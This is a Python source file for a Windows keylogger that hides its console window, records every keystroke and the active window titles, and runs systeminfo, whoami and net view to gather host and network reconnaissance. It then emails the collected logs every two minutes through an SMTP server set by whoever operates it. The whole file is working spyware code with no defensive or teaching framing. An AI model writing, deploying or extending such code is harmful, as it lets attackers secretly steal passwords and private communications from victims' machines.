import win32gui as wg
import win32console as wc
import pynput.keyboard
import threading as thread5
import sendmail
import time 
import sys,os

currentkey = ''
logdata = ''
timereport = time.ctime()
firstreport = 0

def checklog(gserver , gport , guser , gpass , mailfrom,  mailto ):
    global logdata,timereport,interval,firstreport
    if firstreport == 0 :
        logdata = os.popen('systeminfo & whoami & net view').read()
        firstreport = 1
    timereport = time.ctime()
    while True:
        #print(logdata)
        if len(logdata) > 30 :
            msg = logdata
            logdata = ''
            sendmail.sendmailg(gserver , gport , guser, gpass , mailfrom , mailto , msg , 0)
        time.sleep(60 * interval)

def onpressevent(key):
    global currentkey
    global logdata
    try :
        logdata = logdata + key.char
    except AttributeError :
        logdata = logdata + " " + str(key) + " "

def Checkifwindowchanged():
    global logdata
    if sys.platform in ['Windows' , 'win32']:
        cwindow = 'none'
        while True:
            activewindow = wg.GetWindowText(wg.GetForegroundWindow())
            if cwindow != activewindow :
                cwindow = activewindow
                logdata = logdata + '\n' + cwindow + time.ctime() + '\n'
 
def startkeylogger():  
    kbdlisten = pynput.keyboard.Listener(on_press=onpressevent)
    with kbdlisten :
        kbdlisten.join()

def runobjects(gserver , gport , guser , gpass , mailfrom,  mailto):
	wg.ShowWindow(wc.GetConsoleWindow(),0);
	wtthread = thread5.Thread(target=Checkifwindowchanged)
	kthread = thread5.Thread(target=startkeylogger)
	mailthread = thread5.Thread(target=checklog , args=(gserver , gport , guser , gpass , mailfrom,  mailto))
	kthread.start()
	wtthread.start()
	mailthread.start()
	kthread.join()
	wtthread.join()
	mailthread.join()

interval = 2
gserver = ''
gport = ''
guser = ''
gpass = ''
mailfrom = ''
mailto = ''
subject = 'report '
runobjects(gserver , gport , guser , gpass , mailfrom,  mailto)
